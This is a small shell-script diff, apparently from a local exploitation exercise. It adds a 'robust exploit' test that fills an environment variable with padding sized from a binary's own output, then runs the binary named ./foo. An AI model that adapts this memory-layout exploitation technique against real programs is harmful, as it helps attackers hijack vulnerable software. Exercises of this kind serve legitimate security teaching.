@@ -43,3 +43,6 @@ export X=$(python -c "'x'*0x123")
 
 # Clear all non-PATH env vars.
 unset $(env | sed -nre 's/^([^ \t=]*)=.*/\1/p'  | grep -v '^PATH$')
+
+# Test the robust exploit: first clear the env as above, then do:
+export X="" ; export X=$(python -c "print 'x'*(0x`./foo` - 0xea4c)"); ./foo
